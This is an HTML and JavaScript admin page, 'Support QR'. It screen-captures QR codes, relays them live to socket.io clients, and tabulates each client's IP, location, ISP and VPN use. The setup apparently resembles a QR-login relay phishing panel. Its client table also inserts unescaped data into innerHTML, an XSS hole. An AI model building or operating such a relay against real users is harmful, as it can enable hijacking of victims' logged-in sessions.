<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Admin Panel - Support QR</title>
<script src="/socket.io/socket.io.js"></script>
<script src="https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.min.js"></script>
<style>
body {
  font-family: "Segoe UI", Arial, sans-serif;
  background: #f8f9fa;
  margin: 0;
  padding: 25px;
  display: flex;
  flex-direction: column;
  align-items: center;
}
.panel {
  background: white;
  padding: 20px;
  border-radius: 12px;
  box-shadow: 0 0 10px rgba(0,0,0,0.1);
  width: 100%;
  max-width: 900px;
}
.controls { display:flex; flex-wrap:wrap; gap:10px; justify-content:center; margin-bottom:15px; }
button, input { padding:8px 14px; border:none; border-radius:6px; font-weight:600; cursor:pointer; }
button.start { background:#007bff; color:white; }
button.stop { background:#dc3545; color:white; }
button.hide { background:#6c757d; color:white; }
button.pause { background:#ffc107; color:black; }
button:hover { opacity:0.9; }
#qrPreview {
  background:white; border-radius:10px; padding:20px; box-shadow:0 0 6px rgba(0,0,0,0.1);
  display:flex; align-items:center; justify-content:center; min-height:260px; margin-bottom:20px;
}
#statusText { text-align:center; font-weight:bold; margin-bottom:10px; }
.intervalBox { display:flex; align-items:center; gap:5px; }
.intervalBox input { width:80px; border:1px solid #ccc; text-align:right; }
video { display:none; }
table { width:100%; border-collapse:collapse; font-size:0.9rem; }
th, td { border:1px solid #ddd; padding:6px 8px; text-align:center; }
th { background:#e9ecef; }
</style>
</head>
<body>
<div class="panel">
  <h2>Admin Panel - Support QR</h2>
  <div class="controls">
    <button class="start" id="startBtn">Start Stream</button>
    <button class="stop" id="stopBtn">Stop Stream</button>
    <button class="hide" id="hideBtn">Hide</button>
    <button class="pause" id="pauseBtn">Pause</button>
    <div class="intervalBox">
      <label>Scan Interval (s):</label>
      <input id="intervalInput" type="number" step="0.05" min="0.25" max="5" value="0.5">
    </div>
  </div>
  <div id="qrPreview">No active QR</div>
  <div id="statusText">Status: Inactive</div>
  <video id="video" autoplay muted></video>
  <canvas id="canvas"></canvas>
  <table>
    <thead><tr><th>Name</th><th>IP</th><th>City</th><th>Region</th><th>Country</th><th>ISP</th><th>VPN</th><th>Ping (ms)</th></tr></thead>
    <tbody id="clientBody"></tbody>
  </table>
</div>

<script>
const socket = io();
let isStreaming=false, isHidden=false, isPaused=false, currentQR=null, scanInterval=500;
let stream=null, detectLoop=null;

const video=document.getElementById('video');
const canvas=document.getElementById('canvas');
const qrPreview=document.getElementById('qrPreview');
const statusText=document.getElementById('statusText');
const clientBody=document.getElementById('clientBody');
const intervalInput=document.getElementById('intervalInput');

socket.emit('join','admin');

socket.on('client_list',updateClients);
socket.on('state',(s)=>{isStreaming=s.isStreaming;isHidden=s.isHidden;currentQR=s.currentQrValue;updateStatus();updatePreview();});
socket.on('hide_state',(hidden)=>{isHidden=hidden;updateStatus();updatePreview();});
socket.on('qr_preview',(v)=>{if(!isStreaming||isPaused)return;if(!isHidden&&v){currentQR=v;qrPreview.innerHTML=`<img src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=${encodeURIComponent(v)}">`;}});

function updateStatus(){let s=[];if(isStreaming)s.push('Streaming');if(isHidden)s.push('Hidden');if(isPaused)s.push('Paused');statusText.textContent=`Status: ${s.length?s.join(' / '):'Inactive'}`;}
function updatePreview(){if(isHidden)qrPreview.textContent='QR is hidden';else if(!currentQR)qrPreview.textContent='No active QR';else qrPreview.innerHTML=`<img src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=${encodeURIComponent(currentQR)}">`;}

// buttons
document.getElementById('startBtn').onclick=async()=>{
  try{
    stream=await navigator.mediaDevices.getDisplayMedia({video:true});
    video.srcObject=stream;
    socket.emit('start_stream');
    isStreaming=true;updateStatus();
    runDetection();
  }catch(e){alert('Failed to start: '+e.message);}
};
document.getElementById('stopBtn').onclick=()=>{if(detectLoop)clearInterval(detectLoop);if(stream)stream.getTracks().forEach(t=>t.stop());socket.emit('stop_stream');isStreaming=false;currentQR=null;updatePreview();updateStatus();};
document.getElementById('hideBtn').onclick=()=>{isHidden=!isHidden;socket.emit('toggle_hide',isHidden);updateStatus();updatePreview();document.getElementById('hideBtn').textContent=isHidden?'Unhide':'Hide';};
document.getElementById('pauseBtn').onclick=()=>{isPaused=!isPaused;updateStatus();document.getElementById('pauseBtn').textContent=isPaused?'Resume':'Pause';};

intervalInput.oninput=()=>{let v=parseFloat(intervalInput.value);if(isNaN(v)||v<0.25)v=0.25;if(v>5)v=5;scanInterval=v*1000;if(detectLoop){clearInterval(detectLoop);runDetection();}};

function runDetection(){if(detectLoop)clearInterval(detectLoop);const ctx=canvas.getContext('2d');detectLoop=setInterval(()=>{if(!isStreaming||isPaused||!video.videoWidth)return;canvas.width=video.videoWidth;canvas.height=video.videoHeight;ctx.drawImage(video,0,0,canvas.width,canvas.height);const img=ctx.getImageData(0,0,canvas.width,canvas.height);const code=jsQR(img.data,img.width,img.height);if(code&&code.data&&code.data!==currentQR){currentQR=code.data;if(!isHidden)qrPreview.innerHTML=`<img src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=${encodeURIComponent(code.data)}">`;socket.emit('qr_update',code.data);}},scanInterval);}
function updateClients(list){clientBody.innerHTML='';list.forEach(c=>{const tr=document.createElement('tr');tr.innerHTML=`<td>${c.username}</td><td>${c.ip}</td><td>${c.city}</td><td>${c.region}</td><td>${c.country} ${c.countryFlag||''}</td><td>${c.isp}</td><td>${c.vpn?'Yes':'No'}</td><td>${c.ping}</td>`;clientBody.appendChild(tr);});}
</script>
</body>
</html>
